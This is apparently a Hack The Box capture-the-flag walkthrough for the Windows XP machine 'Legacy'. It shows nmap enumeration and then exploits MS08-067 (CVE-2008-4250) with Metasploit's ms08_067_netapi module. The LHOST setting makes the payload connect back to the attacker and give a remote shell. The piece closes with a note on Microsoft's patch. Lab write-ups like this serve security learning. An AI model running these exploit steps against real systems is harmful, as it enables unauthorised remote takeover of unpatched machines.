![logo](/logo.png)

# [LEGACY- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was reeleased on 15 Mar 2017 as the second machine on HTB,Legacy created by ch4p.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *msrpc
  *netbios-ssn
  *Windows-XP
  
###### code-nmap

```sh
nmap -sV -sC -oA nmap/legacy 10.10.10.4
```

###### output

![nmaplegacy](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Legacy/Screenshots/nmaplegacy.png)

```code
❯ nmap -sV -sC -oA nmap/legacy 10.10.10.4                                                                                           ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 09:17 EAT
Nmap scan report for 10.10.10.4
Host is up (0.33s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:da:f6 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-08-09T11:15:50+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m41s, deviation: 2h07m15s, median: 4d22h57m42s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.78 seconds

```

looking at the results we find that they are 3 ports open which is an SMB port its a `windows XP` machine.

port[135]-msrpc
port[139]-netbios-ssn
port[445]-microsoft-ds 


# Exploitation

Some [searching](https://support.microsoft.com/en-us/topic/ms08-067-vulnerability-in-server-service-could-allow-remote-code-execution-ac7878fc-be69-7143-472d-2507a179cd15) turns up with [CVE-2008-4250](https://nvd.nist.gov/vuln/detail/cve-2008-4250). Before diving into the details of my exploit, let’s unpack his vulnerability is a significant security flaw in Microsoft Windows operating systems, particularly affecting the Server service that manages file and printer sharing. The core issue lies in how Windows handles network services, allowing an attacker to send specially crafted network packets to execute arbitrary code remotely. In simpler terms, this vulnerability could enable an attacker to take control of a system without the user’s knowledge, which also has a `Metasploit` module available for it. 

We the launch metasploit console 

###### code 

```sh
msfconsole
```

Then we select the `exploit/windows/smb/ms08_067_netapi` and select relevant parameters;

###### code

 ```sh
search ms08_067_netapi
```

If so, Windows XP SP3 English is the correct target.

###### output

![metasploitlegacy](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Legacy/Screenshots/metasploitlegacy.png)

###### code

```sh
use 8
options
set RHOSTS 10.10.10.4
set LHOST 10.10.14.4
run
```

###### output

![metasploitoption](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Legacy/Screenshots/metasploitoption.png)

Running the module immediately grants a root shell. 

![metasploitoption](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Legacy/Screenshots/meterpreterlegacy.png)

###### code

```sh
shell
```

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Legacy/Screenshots/shelllegacy.png)

The user flag can be obtained from `C:\Documents and Settings\john\Desktop\user.txt` and the
root flag from `C:\Documents and Settings\Administrator\Desktop\root.txt`
###### output

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Legacy/Screenshots/legacyrootuserflag.png)


# The Mitigation: MS08–067

The adventure wouldn’t be complete without discussing the mitigation of this vulnerability. Microsoft released a security update, MS08–067, to patch this critical flaw. This update was crucial for Windows 2000, XP, Vista, and Windows Server 2003 and 2008 users, addressing the vulnerable component in the Server service to prevent such remote exploits. [Bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)

![](Linux/Linux-Easy/Valentine/Screenshots/Windows/Windows-Easy/Legacy/Screenshots/learnlegacy.png)

	-------------------------END successful attack @lesley----------------------


